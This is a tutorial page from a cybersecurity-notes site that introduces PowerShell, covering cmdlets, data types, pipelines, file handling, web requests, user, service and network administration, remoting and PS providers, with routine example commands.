

[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

## Definition
PowerShell, developed by Microsoft, is a robust tool for automating tasks and managing configurations. It integrates a command-line interface with a scripting language based on the .NET framework. Unlike traditional text-based command-line tools, PowerShell is object-oriented, enabling it to manage complex data types and interact more efficiently with system components. While it was initially designed exclusively for Windows, it has since been extended to support macOS and Linux, making it a flexible solution for IT professionals working across multiple operating systems.

In programming, an object represents an entity with attributes (`properties`) and actions (`methods`). For instance, a car object could have properties such as Color, Model, and FuelLevel, along with methods like `Drive()`, `HonkHorn()`, and `Refuel()`.

Similarly, in PowerShell, objects are core components that combine data and functionality, streamlining the process of managing and manipulating information. A PowerShell object can hold data like file names, usernames, or sizes as its properties and include methods, such as copying a file or stopping a process.

Unlike the traditional Command Shell, which processes and outputs plain text, PowerShell cmdlets (short for `command-lets`) return objects that preserve their properties and methods. This object-oriented approach enables more advanced and flexible data manipulation without the need for additional text parsing.
## Setup 
Before running PowerShell scripts, it’s essential to configure your Windows PowerShell setup. Follow these steps:
### Install PowerShell
PowerShell is typically pre-installed on most Windows operating systems. However, if you require an updated version, download it from the Microsoft website or use package managers like Windows Package Manager (Winget) or Chocolatey.
### Launch PowerShell
To open the PowerShell command line, type `powershell.exe` in the Windows Start menu.
### Verify the Execution Policy
PowerShell restricts script execution by default for security purposes. To view the current execution policy, use the following command:
```powershell
Get-ExecutionPolicy
```
### Possible Execution Policy Values
When you check the execution policy using `Get-ExecutionPolicy`, the result will be one of the following:
- **Restricted**: Scripts cannot be run. This is the default setting.
- **AllSigned**: Only scripts signed by a trusted developer are allowed.
- **RemoteSigned**: Locally created scripts can run, but downloaded scripts require a trusted developer's signature.
- **Unrestricted**: All scripts can be run without restriction.
### Modifying the Execution Policy
To change the execution policy, use the `Set-ExecutionPolicy` cmdlet:
```powershell
Set-ExecutionPolicy <PolicyName>
```
Replace `<PolicyName>` with your desired policy, such as `Restricted`, `AllSigned`, `RemoteSigned`, or `Unrestricted`.
## Basics of cmdlets and modules
### Basic Syntax: Verb-Noun
PowerShell commands are referred to as cmdlets (pronounced command-lets). These are significantly more powerful than traditional Windows commands, enabling more sophisticated data manipulation.

Cmdlets adhere to a standardized Verb-Noun naming convention, which simplifies understanding their purpose. The Verb indicates the action to be performed, while the Noun identifies the object of that action. For example:

- **Get-Content**: Fetches (gets) the content of a file and displays it in the console.
- **Set-Location**: Modifies (sets) the current working directory.

### Basic Cmdlets
To view all the cmdlets, functions, aliases, and scripts available in the current PowerShell session, the **Get-Command** cmdlet can be used. This is a vital tool for identifying and exploring the commands that are accessible for execution.
```powershell
PS C:\Users\user> Get-Command 
CommandType Name Version Source 
----------- ---- ------- ------ 
Alias Add-AppPackage 2.0.1.0 Appx 
Alias Add-AppPackageVolume 2.0.1.0 Appx 
Alias Add-AppProvisionedPackage 3.0 Dism 
[...] 
Function A: Function Add-BCDataCacheExtension 1.0.0.0 BranchCache 
Function Add-DnsClientDohServerAddress 1.0.0.0 DnsClient 
[...] 
Cmdlet Add-AppxPackage 2.0.1.0 Appx 
Cmdlet Add-AppxProvisionedPackage 3.0 Dism 
Cmdlet Add-AppxVolume 2.0.1.0 Appx 
[...]
```
For instance, to display only the available commands of type "function," you can use the `-CommandType` parameter with the value `"Function"`, as shown in the example below:
```powershell
Get-Command -CommandType Function
```
Another indispensable cmdlet is **Get-Help**, which offers detailed information about cmdlets, including their usage, available parameters, and examples. It serves as the primary resource for understanding how to effectively use PowerShell commands.
```powershell
PS C:\Users\captain> Get-Help Get-Date
```
For instance, by appending the **`-Examples`** parameter to the **`Get-Help`** command for a specific cmdlet, you can view a list of common usage scenarios and practical examples. Here's how you can do it:
```powershell
Get-Help <Cmdlet-Name> -Examples
```
This provides a quick way to learn how to apply the cmdlet in real-world tasks.

To simplify the transition for IT professionals, PowerShell incorporates **aliases**, which serve as shortcuts or alternative names for cmdlets. These aliases are particularly useful for those already accustomed to traditional command-line tools.
The **`Get-Alias`** cmdlet lists all available aliases in the current session. For example:
- **`dir`** is an alias for **`Get-ChildItem`**.
- **`cd`** is an alias for **`Set-Location`**.
This feature helps bridge familiarity with older tools while leveraging PowerShell's capabilities.

### Downloading External Cmdlets
To locate modules (collections of cmdlets) in online repositories like the PowerShell Gallery, the **`Find-Module`** cmdlet can be used. If you're unsure of the exact module name, you can search using a partial name with a wildcard (`*`) to filter results based on the **`Name`** property.
Here's the general syntax for this approach:
```powershell
Find-Module -Name "powershell*"

Version Name Repository Description 
------- ---- ---------- ----------- 
0.4.7 powershell-yaml PSGallery Powershell module for serializing and deserializing YAML 

2.2.5 PowerShellGet PSGallery PowerShell module with commands for discovering, installing, updating and publishing the PowerShell artifacts like Modules, DSC Resources, Role Capabilities and Scripts.

1.0.80.0 PowerShell.Module.InvokeWinGet PSGallery Module to Invoke WinGet and parse the output in PSOjects 

0.17.0 PowerShellForGitHub PSGallery PowerShell wrapper for GitHub API
```
This allows you to find modules with names that match the specified pattern, making it easier to discover relevant modules.
After identifying a module, you can download and install it from the repository using the **`Install-Module`** cmdlet. This makes the new cmdlets included in the module available for immediate use.
For example:
```powershell
Install-Module -Name <ModuleName>
```
This command fetches the module from the repository and installs it, expanding the functionality of your PowerShell environment.
## Data Types in Powershell
### Common Data Types in PowerShell
- **String**:  
    A sequence of characters enclosed in single quotes (`' '`) or double quotes (`" "`). Strings can contain letters, numbers, symbols, and spaces.  
    Example:
```powershell
$name = "John Doe"
```
**Integer**:  
Whole numbers without any decimal or fractional parts.  
Example:
```powershell
$age = 25
```
**Double**:  
Floating-point numbers with decimal precision, such as `3.14` or `-0.5`.  
Example:
```powershell
$pi = 3.14
```
**Boolean**:  
Often used in conditional expressions and comparisons. Possible values are `true` or `false`.  
Example:
```powershell
$isAdmin = $true
```
**Hashtable**:  
A collection of unique key-value pairs. Hashtables are used to store and retrieve data by named keys.  
Example:
```powershell
$user = @{Name="Alice"; Age=30; Country="USA"}
```
**Array**:  
A collection of ordered and indexed elements, usually of the same data type. You can create an array by assigning a comma-separated list of values enclosed in parentheses to a variable.  
Example:
```powershell
$numbers = @(1, 2, 3, 4, 5)
```
In PowerShell, you can retrieve specific elements of an array using the index operator `[n]`, where `n` represents the zero-based position of the element. The first element has an index of `0`.
```powershell
# Define an array
$fruits = @("Apple", "Banana", "Cherry", "Date")

# Access elements by index
$firstFruit = $fruits[0]    # Output: Apple
$secondFruit = $fruits[1]   # Output: Banana
$lastFruit = $fruits[3]     # Output: Date
```
**Notes**
- Using an invalid index (e.g., out of range) will result in an error.
- Arrays can store elements of different data types, but it's common to have consistent types within an array.
## Variables in Powershell
Variables in PowerShell are used to store and manage data. They act as named containers for values such as strings, numbers, arrays, or objects.
### Key Features of PowerShell Variables:
- **Loosely Typed**:  
    You don't need to declare the data type; PowerShell dynamically determines it based on the assigned value.
- **Naming**:  
    Variable names begin with the `$` symbol followed by the variable name.  
    Example: `$myVariable`.  
    Variable names are **not case-sensitive**, so `$MyVariable` and `$myvariable` refer to the same variable.
- **Scope**:  
    Each variable has a scope that defines where it can be accessed:
    - **Global**: Accessible everywhere.
    - **Script**: Accessible within a single script file.
    - **Function**: Accessible only within a specific function.
    - **Local**: Default scope, accessible only within the current scope.
### Assigning Values to Variables
Use the `=` operator to assign a value to a variable.
##### Examples:
1. Assigning a String:
```powershell
$greeting = "Hello, World!"
```
Assigning a Number:
```powershell
$count = 42
```
These variables can then be used and manipulated throughout your PowerShell session or script.
## Pipes
The pipeline operator (`|`) allows you to connect cmdlets by passing the output of one cmdlet as input to the next. This enables you to construct efficient, one-line commands for complex operations.
### Examples:
1. **Write Output to a File**  
    The following command outputs the string `"Hello, World!"` to a file at `C:\ps\test.txt`:
```powershell
"Hello, World!" | Out-File C:\ps\test.txt
```
**Sort Services by Status**  
The command below retrieves all services on the system and sorts them by their status:
```powershell
Get-Service | Sort-Object -Property Status
```
You can chain multiple cmdlets using multiple pipeline operators (`|`) to perform complex tasks in a sequential flow.
### Example: Filtering and Formatting Service Names
In the following command:
- The first cmdlet retrieves all services.
- The second cmdlet filters for running services.
- The third cmdlet outputs only the display names of those services.
```powershell
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -Property DisplayName
```
### Explanation:
1. **`Get-Service`**: Retrieves a list of all services.
2. **`Where-Object {$_.Status -eq "Running"}`**: Filters the services, selecting only those with a status of "Running".
    - `$_` represents the current object in the pipeline.
    - `-eq` is the equality operator.
3. **`Select-Object -Property DisplayName`**: Extracts only the `DisplayName` property of the filtered services.
### Result:
The output is a list of display names for all running services.
## File System Navigation
PowerShell includes a variety of cmdlets for navigating the file system and managing files, with many having equivalents in the traditional Windows Command Prompt.

For instance, similar to the **`dir`** command in Command Prompt (or **`ls`** in Unix-like systems), **`Get-ChildItem`** lists the files and directories in a specified location. This location is defined using the **`-Path`** parameter. If no path is provided, the cmdlet displays the contents of the current working directory.

Here’s an example:
```powershell
Get-ChildItem -Path "C:\Your\Directory"
```
Or simply to view the contents of the directory you are currently in. This makes it a powerful tool for directory exploration and content viewing.
```powershell
Get-ChildItem
```
To navigate to a different directory, you can use the **`Set-Location`** cmdlet. This cmdlet changes the current working directory to the specified path, similar to the **`cd`** command in Command Prompt.
Here’s how you use it:
```powershell
Set-Location -Path "C:\Your\Target\Directory"
```
Or, simply:
```powershell
Set-Location "C:\Your\Target\Directory"
```
Once executed, the current working directory will be updated to the specified path, allowing you to work in that location.

To create a new item in PowerShell, you can use the **`New-Item`** cmdlet. This allows you to specify the item's path and its type (e.g., a file or a directory).
Here’s an example for creating a directory:
```powershell
New-Item -Path "C:\Your\Target\Directory" -ItemType Directory
```
And for creating a file:
```powershell
New-Item -Path "C:\Your\Target\File.txt" -ItemType File
```
This cmdlet is versatile, enabling you to easily create files, folders, or other item types as needed.

Similarly, the **`Remove-Item`** cmdlet in PowerShell is used to delete both files and directories, combining the functionality of the **`rmdir`** and **`del`** commands in the traditional Windows CLI.
For example, to delete a file:
```powershell
Remove-Item -Path "C:\Your\Target\File.txt"
```
To remove a directory and its contents:
```powershell
Remove-Item -Path "C:\Your\Target\Directory" -Recurse
```
The **`-Recurse`** parameter is used to delete all contents within the directory, ensuring it is removed completely. This unified approach simplifies file and directory deletion tasks.

In PowerShell, you can copy or move files and directories using the **`Copy-Item`** and **`Move-Item`** cmdlets, which correspond to the traditional **`copy`** and **`move`** commands in Windows CLI.
To copy a file or directory:
```powershell
Copy-Item -Path "C:\Source\Item" -Destination "C:\Destination"
```
To move a file or directory:
```powershell
Move-Item -Path "C:\Source\Item" -Destination "C:\Destination"
```
These cmdlets work for both files and directories, making them versatile tools for file management in PowerShell.

To read and display the contents of a file in PowerShell, you can use the **`Get-Content`** cmdlet. This is similar to the **`type`** command in Command Prompt or the **`cat`** command in Unix-like systems.
For example:
```powershell
Get-Content -Path "C:\Your\Target\File.txt"
```
This will output the file's contents directly to the console, allowing you to view the data. It's a convenient way to quickly read and inspect the contents of a file.

The `Get-FileHash` cmdlet is a valuable tool for generating file hashes. This functionality is especially important in incident response, threat hunting, and malware analysis, as it helps verify file integrity and detect any potential tampering or unauthorized modifications. By comparing file hashes, security professionals can ensure the authenticity of files and identify suspicious changes.
```
PS C:\Users\user\Documents\hack> Get-FileHash -Path .\test.txt
```
## Working with Date and Time
**Get-Date**
Retrieves the current date and time. It can also be used to convert strings to DateTime objects and format dates.
```powershell
Get-Date
```
**Get-Date -Format**
Displays the current date and time in a specific format.  
Example:
```powershell
Get-Date -Format "yyyy-MM-dd"  # Output: 2024-12-01
```
**Set-Date**
Sets the system's date and time (requires appropriate permissions).  
Example:
```powershell
Set-Date -Date "2024-12-31 23:59:59"
```
**New-TimeSpan**
Calculates the time difference between two dates and returns a `TimeSpan` object.  
Example:
```powershell
$start = Get-Date "2024-01-01"
$end = Get-Date "2024-12-31"
New-TimeSpan -Start $start -End $end
```
### Examples:
1. **Retrieve the Current Date and Time**:
```powershell
Get-Date
```
**Format the Date**:
```powershell
Get-Date -Format "MM/dd/yyyy HH:mm:ss"
```
**Calculate Days Between Two Dates**:
```powershell
$date1 = Get-Date "2024-01-01"
$date2 = Get-Date "2024-12-31"
(New-TimeSpan -Start $date1 -End $date2).Days
```
These cmdlets are versatile and can be used for a wide variety of tasks involving dates and times.
## Filtering and Sorting
Piping is a method utilized in command-line environments to direct the output of one command as the input for another, enabling a series of operations where data moves seamlessly from one command to the next. Represented by the `|` symbol, this technique is commonly employed in the Windows CLI, as previously mentioned in this module, as well as in Unix-based shells.

In PowerShell, piping is particularly advanced because it transfers objects instead of mere text. These objects not only contain the data but also include properties and methods that define and interact with the data.
For example, if you want to get a list of files in a directory and then sort them by size, you could use the following command in PowerShell:
```powershell
PS C:\Users\user\Documents\captain-cabin> Get-ChildItem | Sort-Object Length
```
In this example, `Get-ChildItem` retrieves files as objects, and the pipe (`|`) passes those file objects to `Sort-Object`, which sorts them based on their `Length` (size) property. This object-based methodology enables more detailed and versatile command sequences.
Here, the `Sort-Object` cmdlet is used to organize objects according to specific properties. Beyond sorting, PowerShell offers a range of cmdlets that, when paired with piping, enable advanced data processing and analysis.
To filter objects based on defined conditions and return only those that satisfy the criteria, the `Where-Object` cmdlet can be utilized. For example, to display only `.txt` files in a directory, you can use:
```powershell
PS C:\Users\user\Documents\captain-cabin> Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"
```
In this case, `Where-Object` filters files based on their `Extension` property, ensuring only files with an extension equal to (`-eq`) `.txt` are displayed.
The `-eq` operator ("equal to") is part of a set of comparison operators commonly used in other scripting languages such as Bash and Python. To demonstrate the power of PowerShell's filtering capabilities, here are some of the most useful operators from this set:

- **`-ne`**: "not equal". This operator is used to exclude objects from the results that meet specific criteria.
- **`-gt`**: "greater than". This operator filters objects that exceed a specified value. Note that it is a strict comparison, excluding objects equal to the specified value.
- **`-ge`**: "greater than or equal to". A non-strict version of `-gt`, combining `-gt` and `-eq`.
- **`-lt`**: "less than". Like `-gt`, this is a strict operator, including only objects that are strictly less than a given value.
- **`-le`**: "less than or equal to". A non-strict version of `-lt`, combining `-lt` and `-eq`.

Additionally, objects can be filtered by matching their properties to a specified pattern using the `-like` operator. For instance:
```powershell
PS C:\Users\user\Documents\captain-cabin> Get-ChildItem | Where-Object -Property "Name" -like "ship*"
```
The next filtering cmdlet, `Select-Object`, is designed to focus on specific properties of objects or to limit the number of objects returned. This makes it an excellent tool for refining output, ensuring that only the most relevant details are displayed. By using `Select-Object`, you can streamline your results to show exactly what you need without unnecessary information.
```powershell
PS C:\Users\captain\Documents\captain-cabin> Get-ChildItem | Select-Object Name,Length
```
The final cmdlet in this set of filtering tools is `Select-String`. This cmdlet is used to search for text patterns within files, functioning similarly to `grep` in Unix-based systems or `findstr` in the Windows Command Prompt. It is particularly useful for locating specific content within log files or documents, making it an essential tool for text-based searches and analysis.
```
PS C:\Users\user\Documents\captain-cabin> Select-String -Path ".\hacker.txt" -Pattern "password"
```
## Interacting with The Web
### Send HTTP GET Requests
Example: Fetch Content from a Web Page
```powershell
# Send a GET request and store the response
$response = Invoke-WebRequest -Uri "https://example.com"
# Display the response content
$response.Content
```
### Send HTTP POST Requests
Example: Submit Data to an API
```powershell
# Define the URI and data to send
$uri = "https://example.com/api/login"
$data = @{
    username = "user"
    password = "pass"
}

# Convert data to JSON and send POST request
$response = Invoke-WebRequest -Uri $uri -Method POST -Body ($data | ConvertTo-Json -Depth 2) -ContentType "application/json"

# Display response
$response.Content
```
### Download a File from the Web
Example: Download a File
```powershell
# Define the URL and save path
$url = "https://example.com/file.zip"
$output = "C:\Temp\file.zip"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Verify file downloaded
Get-Item $output
```
### Work with JSON APIs
Example: Fetch and Parse JSON Data
```powershell
# Fetch JSON data from a REST API
$response = Invoke-RestMethod -Uri "https://api.example.com/data"

# Display the data as an object
$response

# Access specific fields
$response.name
$response.items[0].id
```
### Scrape Web Page Data
Example: Extract Links from a Web Page
```powershell
# Fetch web page
$response = Invoke-WebRequest -Uri "https://example.com"

# Extract and display all links
$response.Links | Select-Object Href, InnerText
```
### Interact with REST APIs
Example: Create, Read, Update, Delete Operations
```powershell
# API URL
$apiUrl = "https://api.example.com/resources"

# Create a new resource (POST)
$newData = @{
    name = "New Resource"
    type = "Example"
} | ConvertTo-Json
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $newData -ContentType "application/json"

# Get existing resources (GET)
$response = Invoke-RestMethod -Uri $apiUrl -Method GET
$response

# Update a resource (PUT)
$updateData = @{
    name = "Updated Resource"
} | ConvertTo-Json
Invoke-RestMethod -Uri "$apiUrl/123" -Method PUT -Body $updateData -ContentType "application/json"

# Delete a resource (DELETE)
Invoke-RestMethod -Uri "$apiUrl/123" -Method DELETE

```
### Send Custom HTTP Headers
Example: Use Authentication or Custom Headers
```powershell
# Define headers
$headers = @{
    "Authorization" = "Bearer <your_token>"
    "Custom-Header" = "CustomValue"
}

# Send a GET request with headers
$response = Invoke-WebRequest -Uri "https://api.example.com/protected" -Headers $headers

# Display response
$response.Content
```
### Work with HTML Content
Example: Parse HTML Elements
```powershell
# Fetch and parse HTML content
$response = Invoke-WebRequest -Uri "https://example.com"

# Extract specific elements
$response.ParsedHtml.getElementsByTagName("title")[0].innerText
$response.ParsedHtml.getElementsByTagName("p") | ForEach-Object { $_.innerText }

```
### Test Website Availability
Example: Ping a Website
```powershell
# Test website connectivity
$uri = "https://example.com"
$response = Test-Connection -ComputerName $uri -Count 1

# Display result
$response
```
### Upload a File to a Web Server
Example: POST File Upload
```powershell
# File to upload
$filePath = "C:\Temp\example.txt"

# API endpoint
$uri = "https://example.com/upload"

# Upload file
$response = Invoke-WebRequest -Uri $uri -Method Post -InFile $filePath -ContentType "multipart/form-data"

# Display response
$response.StatusDescription

```
## System Management
### System Info & User Management
The `Get-ComputerInfo` cmdlet retrieves extensive system information, encompassing details about the operating system, hardware specifications, BIOS, and more. It offers a comprehensive snapshot of the system's configuration in a single command. In comparison, its traditional counterpart, `systeminfo`, provides a more limited subset of these details.
```powershell
PS C:\Users\user> Get-ComputerInfo
```
The `Get-LocalUser` cmdlet is crucial for managing user accounts and gaining insights into the system's security configuration. It lists all local user accounts on the machine, with the default output showing each user's username, account status, and description. This cmdlet provides a straightforward way to review and manage local accounts.
```powershell
PS C:\Users\user> Get-LocalUser
```
Create a new local user
```powershell
New-LocalUser -Name "JohnDoe" -Password (ConvertTo-SecureString "Pa$$w0rd" -AsPlainText -Force) -FullName "John Doe" -Description "Standard User Account"
```
Add user to Administrators group
```powershell
Add-LocalGroupMember -Group "Administrators" -Member "JohnDoe"
```
Disable a user account
```powershell
Disable-LocalUser -Name "JohnDoe"
```
### Networking
Similar to the traditional `ipconfig` command, two PowerShell cmdlets can be used to retrieve comprehensive details about the system's network configuration.
The `Get-NetIPConfiguration` cmdlet provides detailed information about the system's network interfaces, including IP addresses, DNS servers, and gateway configurations. This cmdlet is highly useful for analyzing and troubleshooting network settings.
```powershell
PS C:\Users\user> Get-NetIPConfiguration
```
If specific details about the IP addresses assigned to network interfaces are needed, the `Get-NetIPAddress` cmdlet provides comprehensive information. It displays details for all IP addresses configured on the system, including those that are not currently active. This cmdlet is particularly useful for identifying and managing all IP configurations on the machine.
```powershell
PS C:\Users\captain> Get-NetIPAddress
```
The `Get-NetTCPConnection` cmdlet is used to monitor active network connections, providing details about current TCP connections, including both local and remote endpoints. This cmdlet is especially useful during incident response or malware analysis, as it can help uncover hidden backdoors or established connections to attacker-controlled servers, offering critical insights into potential security threats.
```powershell
PS C:\Users\user> Get-NetTCPConnection
```
Get current IP4 configuration
```powershell
PS C:\Users\user> Get-NetIPAddress -AddressFamily IPv4
```
Set a static IP address
```powershell
PS C:\Users\user> New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.100 -PrefixLength 24 -DefaultGateway 192.168.1.1
```
Configure DNS server
```powershell
PS C:\Users\user>Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses ("8.8.8.8", "8.8.4.4")
```
### Processes and Services
The `Get-Process` cmdlet offers a detailed overview of all currently running processes on the system. It includes critical information such as CPU and memory usage, making it an invaluable tool for monitoring system performance and troubleshooting issues.
```powershell
PS C:\Users\user> Get-Process
```
The `Get-Service` cmdlet provides information about the status of services on the machine, indicating which services are running, stopped, or paused. It is widely used by system administrators for troubleshooting and is also a key tool for forensic analysts investigating anomalous or suspicious services installed on the system.
```powershell
PS C:\Users\captain> Get-Service
```
Example: Start, Stop, and Configure a Service
```powershell
# Check if a service is running 
Get-Service -Name "wuauserv" | Select-Object Name, Status 
# Start a service 
Start-Service -Name "wuauserv" 
# Stop a service 
Stop-Service -Name "wuauserv" 
# Set service startup type to Automatic 
Set-Service -Name "wuauserv" -StartupType Automatic
```
### Software and Package Management
#### Installing and Configuring Software
Example: Install Software Using Package Management
```powershell
# Install a package (e.g., Google Chrome) using Chocolatey
choco install googlechrome -y

# Install a PowerShell module
Install-Module -Name Az -AllowClobber -Scope CurrentUser

# Verify installation
Get-InstalledModule -Name Az
```
### Scheduled Tasks
Example: Create and Manage Scheduled Tasks
```powershell
# Create a new scheduled task
$action = New-ScheduledTaskAction -Execute "notepad.exe"
$trigger = New-ScheduledTaskTrigger -Daily -At 9:00AM
Register-ScheduledTask -TaskName "OpenNotepad" -Action $action -Trigger $trigger

# List scheduled tasks
Get-ScheduledTask

# Remove a scheduled task
Unregister-ScheduledTask -TaskName "OpenNotepad" -Confirm:$false
```
### Remote Systems
Example: Configure Multiple Systems Using PowerShell Remoting
```powershell
# Enable PowerShell Remoting
Enable-PSRemoting -Force

# Run a command on a remote system
Invoke-Command -ComputerName "Server01" -ScriptBlock { Get-Service }

# Apply configurations to multiple servers
$servers = @("Server01", "Server02", "Server03")
Invoke-Command -ComputerName $servers -ScriptBlock {
    Set-Service -Name "wuauserv" -StartupType Automatic
    Start-Service -Name "wuauserv"
}
```
### Backup and Restore Configuration
Example: Backup and Restore IIS Configuration
```powershell
# Backup IIS configuration
Backup-WebConfiguration -Name "MyIISBackup"

# List existing backups
Get-WebConfigurationBackup

# Restore a backup
Restore-WebConfiguration -Name "MyIISBackup"
```
### Monitoring and Reporting
Example: Generate a System Report
```powershell
# Generate a system health report
Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, CsManufacturer

# Export a list of running processes
Get-Process | Export-Csv -Path "C:\Temp\ProcessReport.csv" -NoTypeInformation

```
### Active Directory
Example: Manage AD Users and Groups
```powershell
# Import the Active Directory module
Import-Module ActiveDirectory

# Create a new user in Active Directory
New-ADUser -Name "JaneDoe" -GivenName "Jane" -Surname "Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@example.com" -Path "OU=Users,DC=example,DC=com" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -Enabled $true

# Add a user to a group
Add-ADGroupMember -Identity "IT_Administrators" -Members "JaneDoe"

# Disable an AD account
Disable-ADAccount -Identity "jdoe"
```
## Powershell Remoting
PowerShell Remoting allows administrators to run PowerShell commands and scripts on remote machines. It uses the **Windows Remote Management (WinRM)** protocol and can operate in both interactive and non-interactive modes.
### Key Features of PowerShell Remoting
1. **Run Commands on Remote Systems**:
    - Execute commands on one or more remote computers.
2. **Interactive Sessions**:
    - Start a remote session and interact with the remote system as if you were logged in locally.
3. **Parallel Execution**:
    - Run commands on multiple computers simultaneously.
4. **Security**:
    - Supports Kerberos, NTLM, or certificate-based authentication.
### Enabling PowerShell Remoting
Before using PowerShell Remoting, you need to enable it on the target systems.
#### Enable Remoting on a System
Run the following command with administrative privileges:
```powershell
Enable-PSRemoting -Force
```
This command:
- Configures the WinRM service to start automatically.
- Sets up listener endpoints for remote connections.
- Configures the firewall to allow remote connections.
### PowerShell Remoting Modes
#### 1. Interactive Remoting
Interactive remoting allows you to open a remote session and interact with the remote computer directly.
```powershell
# Start an interactive session
Enter-PSSession -ComputerName RemoteComputerName

# Example: Enter a session with a remote computer
Enter-PSSession -ComputerName "Server01"

# Exit the remote session
Exit-PSSession
```
#### 2. Non-Interactive Remoting
Run commands or scripts on remote computers without opening an interactive session.
```powershell
# Run a command on a remote computer
Invoke-Command -ComputerName RemoteComputerName -ScriptBlock { Get-Process }
```
#### 3. Remoting with Multiple Computers
Run commands on multiple computers simultaneously.
```powershell
# Run a command on multiple computers
Invoke-Command -ComputerName Server01, Server02 -ScriptBlock { Get-Service }
```
#### 4. Persistent Sessions
Create a persistent session with a remote computer to reuse the connection.
```powershell
# Create a persistent session
$Session = New-PSSession -ComputerName RemoteComputerName

# Use the session to run a command
Invoke-Command -Session $Session -ScriptBlock { Get-Process }

# Remove the session when done
Remove-PSSession -Session $Session
```
### Authentication Methods
PowerShell Remoting supports various authentication methods:
1. **Kerberos (Default)**:
    - Used within a domain environment.
    - No additional configuration required.
2. **NTLM**:
    - Used in a workgroup or standalone environments.
    - Requires specifying credentials with the `-Credential` parameter.
3. **Basic Authentication**:
    - Transmits credentials in plain text.
    - Requires HTTPS for secure communication.
4. **Certificate-Based Authentication**:
    - Uses certificates for authentication, often in secure environments.

### Firewall Configuration
PowerShell Remoting requires specific firewall rules to be enabled. When you run `Enable-PSRemoting`, these rules are configured automatically.
If manual configuration is needed:
- Allow inbound traffic on **port 5985 (HTTP)** and **5986 (HTTPS)** for WinRM.
```powershell
# Open firewall port for WinRM
New-NetFirewallRule -Name "WinRM HTTP" -DisplayName "Allow WinRM (HTTP)" -Protocol TCP -LocalPort 5985 -Action Allow
New-NetFirewallRule -Name "WinRM HTTPS" -DisplayName "Allow WinRM (HTTPS)" -Protocol TCP -LocalPort 5986 -Action Allow
```
### Common Cmdlets for PowerShell Remoting

|**Cmdlet**|**Description**|
|---|---|
|`Enable-PSRemoting`|Enables PowerShell Remoting on a computer.|
|`Enter-PSSession`|Starts an interactive session with a remote computer.|
|`Exit-PSSession`|Exits an interactive session.|
|`Invoke-Command`|Runs a command or script on one or more remote computers.|
|`New-PSSession`|Creates a persistent session with a remote computer.|
|`Get-PSSession`|Lists all active remote sessions.|
|`Remove-PSSession`|Closes a remote session.|
|`Test-WSMan`|Tests whether the WinRM service is available on a remote system.|

### Examples
#### Run Commands on a Single Computer
```powershell
Invoke-Command -ComputerName Server01 -ScriptBlock { Get-Process }
```
Run Commands on Multiple Computers
```powershell
Invoke-Command -ComputerName Server01, Server02 -ScriptBlock { Get-Service }
```
Run a Script on a Remote Computer
```powershell
Invoke-Command -ComputerName Server01 -FilePath "C:\Scripts\MyScript.ps1"
```
Run Commands with Credentials
```powershell
$Cred = Get-Credential
Invoke-Command -ComputerName Server01 -Credential $Cred -ScriptBlock { Get-EventLog -LogName Application }
```
Check if WinRM is Available
```powershell
Test-WSMan -ComputerName Server01
```
### Advanced Scenarios
#### 1. Use HTTPS for Secure Communication
By default, PowerShell Remoting uses HTTP. For enhanced security, configure it to use HTTPS.
```powershell
# Create a self-signed certificate
New-SelfSignedCertificate -DnsName "Server01" -CertStoreLocation "Cert:\LocalMachine\My"

# Configure WinRM to use HTTPS
winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname="Server01"; CertificateThumbprint="THUMBPRINT"}
```
#### 2. Implicit Remoting
Import remote modules into the local session for easier management.
```powershell
$Session = New-PSSession -ComputerName Server01
Import-PSSession -Session $Session
```
#### 3. Throttling
Limit the number of simultaneous remote connections.
```powershell
Invoke-Command -ComputerName Server01, Server02, Server03 -ScriptBlock { Get-Service } -ThrottleLimit 2
```
### Common Issues
1. **WinRM Service Not Running**:
    - Ensure the WinRM service is running on the remote machine
```powershell
Start-Service WinRM
```
2. **Authentication Errors**:
    - Use `-Credential` for non-domain systems.
    - Ensure Kerberos or NTLM is enabled for authentication.
3. **Firewall Blocking**:
    - Check that ports 5985 and 5986 are open on the remote machine.
4. **Remoting Disabled**:
    - Ensure PowerShell Remoting is enabled with `Enable-PSRemoting`.
### Best Practices
1. **Use HTTPS**:
    - Always prefer HTTPS over HTTP for secure communication.
2. **Limit Access**:
    - Restrict access to specific IPs or users by configuring WinRM listeners and permissions.
3. **Log Remote Commands**:
    - Log remote operations for auditing and troubleshooting.
4. **Reuse Sessions**:
    - Use persistent sessions (`New-PSSession`) for efficiency when running multiple commands.

## PS Providers
In PowerShell, **PSProviders** (short for "PowerShell Providers") are components that enable access to various types of data stores as though they were file system drives. This abstraction allows you to interact with these data sources using the same cmdlets and techniques used for file system operations, such as `Get-Item`, `Set-Item`, `New-Item`, `Remove-Item`, and others.
#### Common PSProviders
Here are some of the most commonly used PSProviders:
##### FileSystem
- **Description**: Provides access to the file system on your machine.
- **Drive Name**: Usually `C:`, `D:`, etc.
- **Example Usage**:
```powershell
Get-ChildItem -Path C:\
```
##### Registry
- **Description**: Allows access to the Windows Registry.
- **Drives**: `HKLM` (HKEY_LOCAL_MACHINE), `HKCU` (HKEY_CURRENT_USER).
- **Example Usage**:
```powershell
Get-ChildItem -Path HKLM:\Software
```
##### Environment
- **Description**: Provides access to environment variables.
- **Drive**: `Env:`
- **Example Usage**
```powershell
Get-ChildItem -Path Env:
$Env:Path # Access a specific environment variable
```
##### Function
- **Description**: Gives access to functions defined in the current PowerShell session.
- **Drive**: `Function:`
- **Example Usage**:
```powershell
Get-ChildItem -Path Function:
```
##### Variable
- **Description**: Exposes the variables in the current PowerShell session.
- **Drive**: `Variable:`
- **Example Usage**:
```powershell
Get-ChildItem -Path Variable:
